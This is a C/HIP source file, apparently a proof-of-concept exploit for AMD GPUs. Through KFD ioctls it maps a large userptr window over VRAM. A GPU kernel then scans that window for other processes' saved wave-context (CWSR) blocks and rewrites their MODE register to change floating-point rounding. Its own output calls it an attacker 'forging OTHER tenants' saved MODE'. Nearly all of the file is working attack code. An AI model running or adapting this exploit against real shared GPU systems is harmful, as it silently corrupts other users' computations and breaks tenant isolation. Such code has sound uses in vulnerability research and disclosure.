#define _GNU_SOURCE
#include <hip/hip_runtime.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <cerrno>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
extern "C" {
#include <linux/kfd_ioctl.h>
}
#define GPU_ID 46235
static int kfd,drm;
static int find_drm_fd(){DIR*d=opendir("/proc/self/fd");struct dirent*e;char b[256],l[256];
 while((e=readdir(d))){snprintf(b,sizeof b,"/proc/self/fd/%s",e->d_name);ssize_t n=readlink(b,l,sizeof l-1);
 if(n<=0)continue;l[n]=0; if(!strcmp(l,"/dev/dri/renderD128")){closedir(d);return atoi(e->d_name);} } closedir(d);return -1;}
static int alloc_mem(uint64_t va,uint64_t sz,uint32_t fl,uint64_t in,uint64_t*h,uint64_t*out){
 struct kfd_ioctl_alloc_memory_of_gpu_args a;memset(&a,0,sizeof a);a.va_addr=va;a.size=sz;a.gpu_id=GPU_ID;a.flags=fl;a.mmap_offset=in;
 int r=ioctl(kfd,AMDKFD_IOC_ALLOC_MEMORY_OF_GPU,&a); if(!r){if(h)*h=a.handle;if(out)*out=a.mmap_offset;}return r;}
static int map_mem(uint64_t h){uint32_t d=GPU_ID;struct kfd_ioctl_map_memory_to_gpu_args m;memset(&m,0,sizeof m);
 m.handle=h;m.device_ids_array_ptr=(uintptr_t)&d;m.n_devices=1; return ioctl(kfd,AMDKFD_IOC_MAP_MEMORY_TO_GPU,&m)==0?(int)m.n_success:-1;}
/* scan+patch: for every CWSR block (EXEC pair + MODE==0x3f0), set MODE FP_ROUND=3 (0x3f0->0x3f3) */
__global__ void forge(unsigned long long base,unsigned long long dwords,unsigned*cnt,unsigned*seen){
  unsigned long long st=(unsigned long long)gridDim.x*blockDim.x;
  volatile unsigned *p=(volatile unsigned*)base;
  for(unsigned long long k=(unsigned long long)blockIdx.x*blockDim.x+threadIdx.x;k+10<dwords;k+=st){
    if(p[k]==0xFFFFFFFFu && p[k+1]==0xFFFFFFFFu){
      unsigned status=p[k+2], mode=p[k+6];
      if(status&0x10000u) atomicAdd(seen,1u);
      if(mode==0x000003f0u && (status&0x10000u)){ p[k+6]=0x000003f3u; atomicAdd(cnt,1u); }
    }
  }
}
int main(int argc,char**argv){
  unsigned long long win=(4090ULL)<<20; int secs=argc>1?atoi(argv[1]):40;
  unsigned*warm; hipMalloc(&warm,4096);
  drm=find_drm_fd(); kfd=open("/dev/kfd",O_RDWR);
  uint64_t hv,ov;
  if(alloc_mem(0x280000000000ULL,2ULL<<20,KFD_IOC_ALLOC_MEM_FLAGS_VRAM|KFD_IOC_ALLOC_MEM_FLAGS_PUBLIC|
      KFD_IOC_ALLOC_MEM_FLAGS_WRITABLE|KFD_IOC_ALLOC_MEM_FLAGS_NO_SUBSTITUTE,0,&hv,&ov)){printf("vram fail\n");return 1;}
  volatile uint32_t*cpu=(volatile uint32_t*)mmap(NULL,2ULL<<20,PROT_READ|PROT_WRITE,MAP_SHARED,drm,(off_t)ov);
  cpu[0]=0x5A5AA5A5u;(void)cpu[0];
  uint64_t hb=0; const uint64_t VA=0x300000000000ULL;
  if(alloc_mem(VA,win,KFD_IOC_ALLOC_MEM_FLAGS_USERPTR|KFD_IOC_ALLOC_MEM_FLAGS_WRITABLE,(uint64_t)(uintptr_t)cpu,&hb,NULL)||map_mem(hb)<=0){printf("win fail\n");return 1;}
  printf("[attacker] F14 window up; forging OTHER tenants' saved MODE (FP_ROUND=3) for %ds\n",secs);
  unsigned*d_cnt,*d_seen; hipMalloc(&d_cnt,4); hipMalloc(&d_seen,4);
  time_t t0=time(0); unsigned long long total=0; int iters=0;
  while(time(0)-t0 < secs){
    hipMemset(d_cnt,0,4); hipMemset(d_seen,0,4);
    hipLaunchKernelGGL(forge,dim3(4096),dim3(256),0,0,(unsigned long long)VA,win/4,d_cnt,d_seen);
    if(hipDeviceSynchronize()!=hipSuccess) break;
    unsigned c,sn; hipMemcpy(&c,d_cnt,4,hipMemcpyDeviceToHost); hipMemcpy(&sn,d_seen,4,hipMemcpyDeviceToHost); total+=c; iters++; if(iters%20==0) fprintf(stderr,"  pass %d: cand_blocks=%u patched=%u\n",iters,sn,c);
  }
  printf("[attacker] done: %d passes, %llu MODE-forge writes into other processes' CWSR blocks\n",iters,total);
  return 0;
}
